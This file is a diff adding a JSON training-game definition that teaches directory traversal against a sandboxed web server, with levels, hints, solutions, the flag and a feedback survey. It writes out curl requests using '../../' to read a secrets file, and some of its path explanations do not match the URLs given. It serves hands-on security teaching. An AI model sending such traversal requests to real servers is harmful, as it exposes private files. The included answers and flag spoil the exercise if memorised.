@@ -1,0 +1,187 @@
+{
+  "title": "Directory Traversal Vulnerability",
+  "description": "Learn to exploit path traversal vulnerabilities to access files outside the intended web root directory.",
+  "prerequisites": [],
+  "outcomes": [
+    "Understand how web applications can be vulnerable to directory traversal via unvalidated path inputs.",
+    "Use ../ sequences in URLs to navigate outside the intended directory structure.",
+    "Retrieve files that should not be directly accessible via a web browser."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "variant_sandboxes": false,
+  "estimated_duration": 30,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "content": "# General information — please read carefully\n\n* Each level builds on the previous. Do not skip ahead.\n* If you get stuck, use hints or Google the technique.\n* This exercise is educational. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a security researcher testing SecureHost, a file-sharing service. The company claims their web server is secure, but they have not implemented proper input validation on file paths. Your job: prove that you can read files outside the intended directory structure."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "passkey": "start",
+      "cloud_content": "SSH to your attacker machine at **10.1.30.23**, then access the target web server:\n\n```\ncurl http://10.1.30.10/files/documents/README.txt\n```\n\nThe target is at **10.1.30.10** on HTTP port 80. Do not attack outside the sandbox. Submit **start** to begin.",
+      "local_content": "Access the target web server locally:\n\n```\ncurl http://127.0.0.1/files/documents/README.txt\n```\n\nSubmit **start** to begin."
+    },
+    {
+      "title": "Discover the Traversal Vector",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 8,
+      "answer": "..",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "The SecureHost application is supposed to serve only files from `/files/documents/`. However, the URL path is passed directly to the web server without validation.\n\nDirectory traversal attacks use a special sequence to move up the directory tree. In Unix-like systems, every directory has a special name for its parent directory. What is this name?\n\nTry accessing a simple test:\n\n```\ncurl http://10.1.30.10/files/documents/README.txt\n```\n\nThen try to go up one level:\n\n```\ncurl http://10.1.30.10/files/[TRAVERSAL_SEQUENCE]/files/documents/README.txt\n```\n\nIf you see the same file content, you have successfully navigated up and back down — confirming the traversal works.\n\n**What is the special directory name used to refer to the parent directory?**",
+      "solution": "```\n$ curl http://10.1.30.10/files/documents/README.txt\nThis is a public document...\n\n$ curl http://10.1.30.10/files/../files/documents/README.txt\nThis is a public document...\n```\n\nThe sequence `..` refers to the parent directory. Using it in the path allows traversal.",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "What is the parent directory reference in Unix?",
+          "content": "In Unix/Linux, `..` (two dots) represents the parent directory. `../` moves up one level.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "How would you use it in a URL?",
+          "content": "If you are at `/files/documents/`, then `../` takes you to `/files/`, and `../../` takes you to `/`.",
+          "hint_penalty": 2,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1083" }
+      ]
+    },
+    {
+      "title": "Escape the Intended Directory",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 10,
+      "answer": "secrets",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have confirmed that `..` works to navigate the directory tree. Now use this to escape the intended `/files/documents/` directory.\n\nSecureHost has placed a `secrets/` directory next to `/files/` in the web root. It was meant to be hidden from users, but without proper access controls, you can reach it via directory traversal.\n\nFrom `/files/documents/`, you need to go up two levels (to `/`) then access the sibling directory:\n\n```\ncurl http://10.1.30.10/files/../../secrets/flag.txt\n```\n\nLook at the response — it contains a directory or file name. What is that name (without the trailing slash)?",
+      "solution": "```\n$ curl http://10.1.30.10/files/../../secrets/flag.txt\nWMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}\n```\n\nThe directory we escaped into is **secrets**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How many levels up do you need to go?",
+          "content": "From `/files/documents/` you need to go up 2 levels to reach `/`. That means `../../`.",
+          "hint_penalty": 3,
+          "order": 0
+        },
+        {
+          "title": "What path should you construct?",
+          "content": "Start with `/files/`, then add `../../secrets/` to escape and access the sibling directory.",
+          "hint_penalty": 5,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 25,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1083" }
+      ]
+    },
+    {
+      "title": "Retrieve the Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 5,
+      "answer": "WMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have escaped the intended directory structure. Now retrieve the flag file from the secrets directory.\n\nRun:\n\n```\ncurl http://10.1.30.10/files/../../secrets/flag.txt\n```\n\nThe entire response is the flag — a string starting with `WMG{` and ending with `}`.\n\nIn a real engagement, this same technique could expose configuration files, private keys, database backups, or any other file the web server process can read.\n\n**Submit the flag from the response.**",
+      "solution": "```\n$ curl http://10.1.30.10/files/../../secrets/flag.txt\nWMG{d1r_trav3rs4l_n0_s4n1t1z3d_p4ths}\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What is the exact URL?",
+          "content": "Use the same URL pattern from the previous level: `/files/../../secrets/flag.txt`",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "What format is the flag?",
+          "content": "The flag starts with `WMG{` and ends with `}`.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 50,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1083" }
+      ]
+    },
+    {
+      "title": "Feedback",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 5,
+      "estimated_duration": 5,
+      "assessment_type": "QUESTIONNAIRE",
+      "instructions": "Help us improve this game.",
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "How difficult was this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            { "text": "Too easy",      "correct": true, "order": 0 },
+            { "text": "About right",   "correct": true, "order": 1 },
+            { "text": "Too difficult", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Had you encountered directory traversal before?",
+          "points": 0,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            { "text": "Yes, I knew about it",       "correct": true, "order": 0 },
+            { "text": "I had heard of it",        "correct": true, "order": 1 },
+            { "text": "No, this was new to me",   "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "How clear were the instructions?",
+          "points": 0,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            { "text": "Very clear",         "correct": true, "order": 0 },
+            { "text": "Mostly clear",        "correct": true, "order": 1 },
+            { "text": "Confusing at times",  "correct": true, "order": 2 },
+            { "text": "Hard to follow",      "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What would you improve?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": false,
+          "choices": []
+        }
+      ]
+    }
+  ]
+}
